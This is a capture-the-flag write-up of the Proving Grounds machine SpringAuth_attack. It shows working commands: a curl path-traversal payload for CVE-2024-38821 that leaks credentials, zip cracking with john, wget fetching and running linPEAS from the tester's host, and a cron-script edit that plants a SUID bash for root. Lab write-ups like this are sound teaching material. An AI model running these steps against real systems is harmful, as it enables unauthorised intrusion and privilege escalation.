---
title: "Proving Grounds: SpringAuth_attack Writeup"
date: 2026-03-24
categories: [CTF Writeups, Proving Grounds]
tags: [spring, CVE-2024-38821, path traversal, privilege escalation, linux, cron, linpeas, pspy, ftp, john]
---

Proving Grounds is Offensive Security's practice lab platform — essentially a range of intentionally vulnerable machines that are great for sharpening practical pen testing skills. This is a writeup for **SpringAuth_attack**, rated Intermediate with a community rating of "Very Hard." It involves exploiting a real CVE in a Java Spring Boot application to leak credentials, followed by a classic cron-based privilege escalation. I finished it in 3 hours 13 minutes.

---

## Recon

The first step was running my usual nmap scan against the target:

```bash
sudo nmap -Pn -n 192.168.110.117 -sC -sV -p- --open
```

![nmap scan showing FTP and port 8080](/assets/img/springauth/01-nmap-scan.png)

This revealed a few interesting things right away — FTP was running on port 21 with anonymous login allowed, there was a file called `Project-metadata.zip` sitting on the server, SSH was open, and there was a web application running on port 8080.

Before grabbing the zip I decided to check out the web app first. Port 8080 showed a basic mostly-empty cybersecurity website. I ran dirb, gobuster, and nikto against it but came up empty — every request to any subdirectory immediately returned a 302 redirect to `/login` with nothing else useful.

After subdomain enumeration failed I went back to the obvious next step and connected to the FTP server.

![FTP anonymous login](/assets/img/springauth/02-ftp-login.png)

---

## Cracking the zip

After downloading `Project-metadata.zip` I tried to open it, but the file was password protected. Since subdomain enumeration had found nothing useful, I figured cracking the zip was the intended next step.

First I generated a hash with zip2john:

```bash
zip2john Project-metadata.zip > Project-metadata.hash
```

Then ran john against it with rockyou.txt:

```bash
john Project-metadata.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![john cracking the zip password](/assets/img/springauth/03-john-crack.png)

Password cracked. Inside the zip was a single file — `Structure.png` — showing the project structure of a Java Spring Boot web application.

![Spring Boot project structure](/assets/img/springauth/04-project-structure.png)

This immediately gave me a useful map of the application's file layout. The `static/` directory stood out — it contained a `config/` folder with a file simply called `config`. That's interesting.

---

## Exploiting CVE-2024-38821

The lab description mentioned using CVE-2024-38821 to leak sensitive information. A quick search turned up a PoC on GitHub.

**What is CVE-2024-38821?**

CVE-2024-38821 is a critical authorization bypass vulnerability in Spring WebFlux applications (versions 5.7.0 through 6.3.3), disclosed on October 22, 2024. The vulnerability stems from un-normalized URLs — before the patch, the `WebFilterChainProxy` filter processed potentially un-normalized request paths when determining which security filters to apply, which allowed maliciously crafted paths to slip through access controls.

In practical terms: if `/css/**` is configured as publicly accessible and `/secret/**` requires authentication, an attacker can access `/secret/secret-file.txt` by requesting `/css/../secret/secret-file.txt` instead. The path starts with `/css/` so it matches the allowed pattern, but after traversal it resolves to the protected resource.

![CVE-2024-38821 PoC explanation](/assets/img/springauth/05-cve-poc-explanation.png)

The `--path-as-is` flag in curl is key here — it tells curl not to normalize the URL before sending it, which is exactly what we need for the traversal to work.

Armed with the project structure from `Structure.png`, I knew the config file lived at `static/config/config`. Since `static/css/` was the publicly accessible path, the traversal payload was:

```bash
curl -v --path-as-is "http://192.168.110.117:8080/css/../config/config"
```

![curl request leaking credentials from config file](/assets/img/springauth/06-credentials-leaked.png)

Right there at the bottom of the response:

```
# dev creds
username=dev
password=s3cr3tP@ss
```

---

## Initial access

I first tried the credentials at `http://192.168.110.117:8080/login` but got an invalid login error. Remembering that nmap had shown SSH open, I tried there instead:

```bash
ssh dev@192.168.110.117
```

That worked. After logging in I ran `whoami` to confirm the `dev` account, then `ls` — and there was `local.txt`.

![SSH login as dev and first flag](/assets/img/springauth/07-ssh-login-dev.png)

![First flag](/assets/img/springauth/08-local-flag.png)

First flag captured.

---

## Privilege escalation

The lab description mentioned a modifiable cron job script as the privilege escalation vector. I tried the usual manual checks first:

```bash
cat /etc/crontab
ls -l /etc/cron*
```

![Manual cron enumeration — nothing useful](/assets/img/springauth/09-cron-manual.png)

Nothing immediately exploitable. None of the jobs were writable by the `dev` user.

I decided to run linPEAS to cast a wider net. To get it onto the target I spun up a Python HTTP server on my machine from the linPEAS directory:

```bash
python3 -m http.server 80
```

Then on the target:

```bash
wget http://192.168.45.222/linpeas.sh
chmod 755 ./linpeas.sh
./linpeas.sh
```

LinPEAS generates a lot of output, but knowing I was looking for a vulnerable cron job I jumped straight to the writable root-owned executables section.

![linPEAS finding writable clean_logs.sh](/assets/img/springauth/10-linpeas-writable.png)

`/opt/devscripts/clean_logs.sh` — root-owned, world-writable. The `dev` user can modify it. Now I just needed to confirm something was actually running it on a schedule. I couldn't find a direct crontab entry for it, so this was the perfect time to try out [pspy](https://github.com/DominicBreuker/pspy) — an unprivileged process snooping tool that watches for process execution without needing root.

I downloaded and ran it on the target the same way I transferred linPEAS. Almost immediately I saw:

```
/bin/sh -c /opt/devscripts/clean_logs.sh
```

And then exactly one minute later, the same entry again.

![pspy showing clean_logs.sh running as root every minute](/assets/img/springauth/11-pspy-cronjob.png)

Root is running this script every minute via cron. Since `dev` can write to it, this is a textbook privilege escalation.

I edited the script and added two lines:

```bash
cp /bin/bash /tmp/bash
chmod +xs /tmp/bash
```

This copies bash to `/tmp` and sets the SUID bit, so running it with `-p` preserves the root effective UID. Then I just waited for the next cron execution and ran:

```bash
/tmp/bash -p
```

```bash
whoami
# root
```

The final flag was in `/root/proof.txt`.

![Root shell and final flag](/assets/img/springauth/12-root-flag.png)

---

## Reflection

Finished in **3 hours 13 minutes 44 seconds** — happy with that for an Intermediate/Very Hard rated machine, but there are definitely areas to tighten up.

The biggest time sink was the path traversal phase — I spent a lot of time guessing paths before finding the config file. The project structure screenshot from the zip was the key hint I should have leaned on harder from the start. Once I had that map the right path was obvious in hindsight.

The privilege escalation also took longer than it needed to because I spent time manually hunting for the cron job before reaching for pspy. In the future I'd run pspy much earlier in the privesc phase rather than only after manual enumeration fails.

**Tools used:** nmap, zip2john, john, dirb, gobuster, nikto, curl, linPEAS, pspy
